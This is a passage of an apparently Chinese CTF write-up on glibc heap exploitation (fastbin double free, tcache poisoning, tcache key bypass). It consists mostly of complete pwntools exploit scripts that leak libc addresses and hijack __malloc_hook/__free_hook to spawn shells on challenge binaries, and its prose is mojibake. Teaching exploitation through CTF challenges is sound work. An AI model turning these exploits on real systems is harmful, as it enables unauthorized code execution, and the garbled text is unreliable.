class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&#x27;./mulnote&#x27;</span>, env = &#123;<span class="hljs-string">&#x27;LD_PRELOAD&#x27;</span>:<span class="hljs-string">&#x27;./libc.so&#x27;</span>&#125;)<br>e = ELF(<span class="hljs-string">&#x27;./mulnote&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>one_gadget = <span class="hljs-number">0x4526a</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">command</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;&gt;&quot;</span>)<br>    p.sendline(command)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">size:<span class="hljs-built_in">int</span>, content</span>):<br>    cmd(<span class="hljs-string">b&#x27;C&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;size&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;note&gt;&quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span>, content</span>):<br>    cmd(<span class="hljs-string">b&#x27;E&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;index&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;new note&gt;&quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-string">b&#x27;R&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;index&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    cmd(<span class="hljs-string">b&#x27;S&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    <span class="hljs-comment"># initialize</span><br>    new(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 0</span><br>    new(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 1</span><br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 2</span><br>    new(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 3</span><br><br>    <span class="hljs-comment"># leak the libc</span><br>    free(<span class="hljs-number">2</span>)<br>    show()<br>    main_arena = u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)) - <span class="hljs-number">88</span><br>    __malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>    libc_base = __malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    log.success(<span class="hljs-string">&#x27;libc base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>    <span class="hljs-comment"># fastbin double free</span><br>    free(<span class="hljs-number">0</span>)<br>    free(<span class="hljs-number">1</span>)<br>    free(<span class="hljs-number">0</span>)<br><br>    <span class="hljs-comment"># fastbin attack</span><br>    new(<span class="hljs-number">0x60</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">0x23</span>)) <span class="hljs-comment"># idx 0</span><br>    new(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 1</span><br>    new(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 2, overlapping chunk with idx 0</span><br>    new(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x13</span> + p64(libc_base + one_gadget))<br><br>    <span class="hljs-comment"># get the shell</span><br>    cmd(<span class="hljs-string">b&#x27;C&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;size&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x10</span>).encode())<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/02/24/cW9bfsqA5ky7a2h.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h4 id="II-tcache-double-free"><a href="#II-tcache-double-free" class="headerlink" title="II.tcache double free"></a>II.tcache double free</h4><p>å‰é¢è®²åˆ°ï¼Œç”±äºæ£€æŸ¥ååˆ†ç¨€æ¾çš„ç¼˜æ•…ï¼Œè‡ª libc2.2 6èµ·å¼•è¿›çš„ tcache æœºåˆ¶ä¾¿æˆä¸ºäº† ptmalloc åˆ©ç”¨çš„å¤§çƒ­é—¨ï¼Œlibc2.29å‰å¯¹äº double free å‡ ä¹è§†è€Œä¸è§çš„æœºåˆ¶ä¹Ÿè®© pwn æ‰‹ä»¬ä¸ç”¨ç»å°½è„‘æ±æ„é€ ä»¥å‰å½¢å¦‚<code>A-&gt;B-&gt;A</code>çš„å¤æ‚åˆ©ç”¨é“¾</p>
<p>é€šè¿‡è¯¸å¦‚ tcache double free ç­‰æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥è¾¾åˆ°ä¿®æ”¹ tcache_entry çš„ next æŒ‡é’ˆçš„ç›®çš„ï¼Œä»è€Œåœ¨ä»»æ„åœ°å€åˆ†é…åˆ°ä¸€ä¸ª chunkï¼Œè¿™ç§æ‰‹æ³•ä¹Ÿå«åš<strong>tcache poisoning</strong></p>
<blockquote>
<p>åˆ°åº•æ˜¯è°èµ·è¿™ä¹ˆå¤šå¥‡å¥‡æ€ªæ€ªçš„åå­—ï¼ˆæ¼ï¼‰</p>
</blockquote>
<h5 id="ä¾‹é¢˜ï¼šciscn-2019-es-1-Use-After-Free-tcache-poisoning"><a href="#ä¾‹é¢˜ï¼šciscn-2019-es-1-Use-After-Free-tcache-poisoning" class="headerlink" title="ä¾‹é¢˜ï¼šciscn_2019_es_1 - Use After Free + tcache poisoning"></a>ä¾‹é¢˜ï¼šciscn_2019_es_1 - Use After Free + tcache poisoning</h5><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œä¿æŠ¤å…¨å¼€</p>
<p><img src="https://i.loli.net/2021/04/07/ZaHXOWpYDhPAFJ7.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>å¤§æ¦‚æ˜¯æœ‰ç€åˆ†é…ã€æ‰“å°ã€é‡Šæ”¾å †å—çš„åŠŸèƒ½</p>
<p>æ¼æ´ç‚¹åœ¨äºé‡Šæ”¾æ—¶æŒ‡é’ˆæœªç½®0ï¼Œå­˜åœ¨ UAFï¼ˆ<del>æš—ç¤º996çš„å…¬å¸æ°¸è¿œä¸å¯èƒ½è¢«çœŸæ­£æ¶ˆç­</del>ï¼ˆâ†ğŸ”«</p>
<p><img src="https://i.loli.net/2021/04/07/vk6zEGilmgOD9aw.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>libc 2.27ï¼Œæ²¡æœ‰ double freeæ£€æµ‹ï¼Œå¥—æ¿å­ä¸€å¥—å¸¦èµ°ï¼ˆæ„Ÿè§‰ç°åœ¨å¤§éƒ¨åˆ†é¢˜ç›®éƒ½æ˜¯å¥—æ¿å­aâ€¦ï¼‰</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;DEBUG&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27368</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.27.so&#x27;</span>)<span class="hljs-comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)# </span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">choice:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;choice:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(choice).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">size:<span class="hljs-built_in">int</span>, content</span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the size of compary&#x27;s name&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;please input name:&quot;</span>)<br>    p.send(content)<br>    p.recvuntil(<span class="hljs-string">b&quot;please input compary call:&quot;</span>)<br>    p.send(<span class="hljs-string">b&#x27;;/bin/sh\x00&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    new(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 0</span><br>    new(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 1</span><br>    new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 2</span><br>    new(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment"># idx 3</span><br>    free(<span class="hljs-number">0</span>)<br>    free(<span class="hljs-number">0</span>)<br>    dump(<span class="hljs-number">0</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;name:\n&#x27;</span>)<br>    heap_leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    heap_base = heap_leak &amp; <span class="hljs-number">0xfffffffff000</span><br>    log.success(<span class="hljs-string">&#x27;heap base leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br>    free(<span class="hljs-number">0</span>)<br>    free(<span class="hljs-number">0</span>)<br>    new(<span class="hljs-number">0x10</span>, p64(heap_base + <span class="hljs-number">0x10</span>)) <span class="hljs-comment"># idx 4</span><br>    new(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;\x07&#x27;</span> * <span class="hljs-number">0xf</span>) <span class="hljs-comment"># idx 5, hijack the tcache</span><br>    free(<span class="hljs-number">2</span>)<br>    dump(<span class="hljs-number">2</span>)<br>    main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span><br>    __malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>    libc_base = __malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    log.success(<span class="hljs-string">&#x27;libc base leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>    free(<span class="hljs-number">0</span>)<br>    free(<span class="hljs-number">0</span>)<br>    new(<span class="hljs-number">0x10</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]))<br>    new(<span class="hljs-number">0x10</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>    free(<span class="hljs-number">3</span>)<br><br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/07/Lm26WXhGQRPFAdC.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h4 id="III-tcache-key-bypassï¼ˆlibc-2-29-and-upï¼‰"><a href="#III-tcache-key-bypassï¼ˆlibc-2-29-and-upï¼‰" class="headerlink" title="III.tcache key bypassï¼ˆlibc 2.29 and upï¼‰"></a>III.tcache key bypassï¼ˆlibc 2.29 and upï¼‰</h4><p>å‰é¢è®²åˆ°ï¼Œè‡ª glibc2.29 ç‰ˆæœ¬èµ· tcache æ–°å¢äº†ä¸€ä¸ª key å­—æ®µï¼Œè¯¥å­—æ®µä½äº chunk çš„ bk å­—æ®µï¼Œå€¼ä¸º tcache ç»“æ„ä½“çš„åœ°å€ï¼Œè‹¥ free() æ£€æµ‹åˆ° chunk-&gt;bk &#x3D;&#x3D; tcache åˆ™ä¼šéå† tcache å¯¹åº”é“¾è¡¨ä¸­æ˜¯å¦æœ‰è¯¥chunk</p>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åœ¨è¿›è¡Œ tcache double free ä¹‹å‰ï¼Œè¿˜éœ€è¦æƒ³åŠæ³•ç»•è¿‡ tcache key çš„ä¿æŠ¤ï¼Œä½†å¥½å¤„æ˜¯<strong>æˆ‘ä»¬å¯ä»¥é€šè¿‡tcache keyç›´æ¥æ³„éœ²å †åŸºå€</strong></p>
<p>CTFä¸­æ¶‰åŠ tcache key çš„é¢˜ç›®ä¸­é€šå¸¸éƒ½ä¼šæä¾›æœ‰æ¸…é™¤è¯¥keyçš„æ–¹æ³•ï¼Œè‹¥æ²¡æœ‰ä¹Ÿå¯ä»¥åœ¨å¡«æ»¡tcacheåé‡æ–°å›å½’fastbinçš„åˆ©ç”¨</p>
<p>å¸¸è§çš„ tcache key bypass æ‰‹æ®µå¦‚ä¸‹ï¼š</p>
<ul>
<li><strong>æ¸…é™¤ tcache key</strong>ï¼šé€šè¿‡ä¸€äº›å¯¹äºå‚æ‚¬æŒ‡é’ˆçš„åˆ©ç”¨æ‰‹æ®µå°†è¯¥ free chunk ä¸­è®°å½•çš„ tcache keyæ¸…é™¤ï¼Œä»è€Œç»•è¿‡è¯¥æ£€æµ‹</li>
<li><strong>tcache stash with fastbin double free</strong>ï¼šåœ¨ fastbin ä¸­å¹¶æ²¡æœ‰ä¸¥å¯†çš„ double free æ£€æµ‹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å¡«æ»¡å¯¹åº”çš„ tcache é“¾æ¡å<strong>åœ¨ fastbin ä¸­å®Œæˆ double freeï¼Œéšåé€šè¿‡ stash æœºåˆ¶å°† fastbin ä¸­ chunk å€’å› tcache ä¸­</strong></li>
</ul>
<h5 id="ä¾‹é¢˜1ï¼ˆæ¸…é™¤tcache-keyï¼‰ï¼šbytectf2020-final-awd-day1-diary"><a href="#ä¾‹é¢˜1ï¼ˆæ¸…é™¤tcache-keyï¼‰ï¼šbytectf2020-final-awd-day1-diary" class="headerlink" title="ä¾‹é¢˜1ï¼ˆæ¸…é™¤tcache keyï¼‰ï¼šbytectf2020 - final - awd day1 - diary"></a>ä¾‹é¢˜1ï¼ˆæ¸…é™¤tcache keyï¼‰ï¼šbytectf2020 - final - awd day1 - diary</h5><p><a href="/download/bytectf2020/final/awd/day1/diary/diary" title="ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜">ç‚¹å‡»ä¸‹è½½-diary</a></p>
<p>å¤§æ¦‚æ˜¯ä»¥ä¸‹å‡ ä¸ªç‚¹ï¼š</p>
<ul>
<li>deleteå †å—çš„æ—¶å€™æ²¡æœ‰ç½®é›¶å­˜åœ¨UAFï¼Œé‡æ–°editå¯ä»¥æ¸…é™¤tcache keyç»•è¿‡æ£€æµ‹</li>
<li>editæ—¶ä¼šè¾“å‡ºå †å—å¤§å°ï¼Œä¹Ÿå°±æ˜¯è¾“å‡ºFDï¼ŒFDæŒ‡é’ˆç”¨æ¥å­˜å‚¨å †å—å¤§å°ï¼Œå¯ä»¥æ³„éœ²å †åœ°å€å’Œ libc åŸºå€</li>
<li>ç”±äºçŠ¯äº†ä»¥chunkçš„FDæŒ‡é’ˆæ¥åˆ¤æ–­å †å—å¤§å°çš„é€»è¾‘é”™è¯¯åˆ¤æ–­ï¼Œäºæ˜¯deleteåå†editå¯ä»¥è¿›è¡Œå †å—æº¢å‡º</li>
<li>ä¿®æ”¹__free_hookä¸ºsystemä»¥åé‡Šæ”¾ä¸€ä¸ªå†…å®¹ä¸ºâ€&#x2F;bin&#x2F;shâ€çš„å—å³å¯get shell</li>
</ul>
<p>ç¬”è€…åœ¨æ¯”èµ›ä¸­è¸©å‘çš„ç‚¹ï¼š</p>
<ul>
<li>ç”±äºFDç”¨äºå‚¨å­˜å †å—å¤§å°ï¼Œåˆ©ç”¨editæ³„éœ²main_arenaçš„æ—¶å€™ä¼šç ´åBKï¼Œéœ€è¦æ‰‹åŠ¨å°†main_arena + 96è¾“å›å»</li>
<li>åŒä¸Šï¼Œç”±äºè¾“å…¥éƒ½æ˜¯ä»BKå¼€å§‹ï¼Œæ•…éœ€è¦å †æº¢å‡ºæ”¹ä¸€ä¸ªchunkçš„FDä¸ºâ€&#x2F;bin&#x2F;shâ€</li>
</ul>
<p>ç¬”è€…åœ¨æ¯”èµ›æ—¶å†™çš„expå¦‚ä¸‹ï¼šï¼ˆç¨å¾®æœ‰ä¸€ä¸¶ä¹±â€¦ï¼‰</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;DEBUG&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p = process(<span class="hljs-string">&#x27;./diary&#x27;</span>)<span class="hljs-comment">#remote(&#x27;&#x27;, 5021)</span><br>e = ELF(<span class="hljs-string">&#x27;./diary&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span>) <span class="hljs-comment"># test locally</span><br>one_gadget = <span class="hljs-number">0xe6e73</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;Options&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">name, size:<span class="hljs-built_in">int</span>, content</span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Name:&quot;</span>)<br>    p.sendline(name)<br>    p.recvuntil(<span class="hljs-string">b&quot;Size:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;Content:&quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">name, content</span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Name:&quot;</span>)<br>    p.sendline(name)<br>    p.recvuntil(<span class="hljs-string">b&quot;bytes:&quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">name</span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Name:&quot;</span>)<br>    p.sendline(name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">guess</span>():<br>    cmd(<span class="hljs-number">4</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    new(<span class="hljs-string">&#x27;arttnba1&#x27;</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>    new(<span class="hljs-string">&#x27;arttnba0&#x27;</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;arttnba0&#x27;</span>)<br>    new(<span class="hljs-string">&#x27;arttnba2&#x27;</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;arttnba2&#x27;</span>)<br>    new(<span class="hljs-string">&#x27;shell&#x27;</span>, <span class="hljs-number">0x30</span>, <span class="hljs-string">&#x27;shell&#x27;</span>)<br>    new(<span class="hljs-string">&#x27;sheep&#x27;</span>, <span class="hljs-number">0x30</span>, <span class="hljs-string">&#x27;sheep&#x27;</span>)<br>    <span class="hljs-comment">#gdb.attach(p)</span><br><br>    <span class="hljs-comment"># fill the tcache</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        free(<span class="hljs-string">&#x27;arttnba0&#x27;</span>)<br>        edit(<span class="hljs-string">&#x27;arttnba0&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-comment"># clear the tcache key</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        free(<span class="hljs-string">&#x27;shell&#x27;</span>)<br>        edit(<span class="hljs-string">&#x27;shell&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        free(<span class="hljs-string">&#x27;arttnba2&#x27;</span>)<br>        edit(<span class="hljs-string">&#x27;arttnba2&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br>    <span class="hljs-comment"># leak the heap addr</span><br>    free(<span class="hljs-string">&#x27;arttnba2&#x27;</span>)<br>    p.recv()<br>    cmd(<span class="hljs-number">2</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Name:&quot;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;arttnba2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input&quot;</span>)<br>    heap_addr = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;bytes&#x27;</span>, drop = <span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br>    p.sendline(<span class="hljs-string">&#x27;&#x27;</span>)<br><br><br>    new(<span class="hljs-string">&#x27;arttnba3&#x27;</span>, <span class="hljs-number">0x90</span>, <span class="hljs-string">&#x27;arttnba3&#x27;</span>)<br>    <span class="hljs-comment"># fill the tcache</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        free(<span class="hljs-string">&#x27;arttnba3&#x27;</span>)<br>        edit(<span class="hljs-string">&#x27;arttnba3&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br>    <span class="hljs-comment"># leak the libc</span><br>    free(<span class="hljs-string">&#x27;arttnba3&#x27;</span>)<br>    p.recv()<br>    cmd(<span class="hljs-number">2</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Name:&quot;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;arttnba3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input&quot;</span>)<br>    main_arena = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;bytes&#x27;</span>, drop = <span class="hljs-literal">True</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">96</span><br>    p.sendline(p64(main_arena + <span class="hljs-number">96</span>)) <span class="hljs-comment"># fix the heap</span><br>    malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>    libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    log.info(<span class="hljs-string">&#x27;libc addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    <span class="hljs-comment"># tcache poisoning</span><br>    edit(<span class="hljs-string">&#x27;arttnba0&#x27;</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x8</span> + <span class="hljs-number">0x50</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0</span> + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] - <span class="hljs-number">8</span>) * <span class="hljs-number">3</span>)<br>    new(<span class="hljs-string">&#x27;arttnba7&#x27;</span>, <span class="hljs-number">0x20</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])*<span class="hljs-number">2</span>)<br>    new(<span 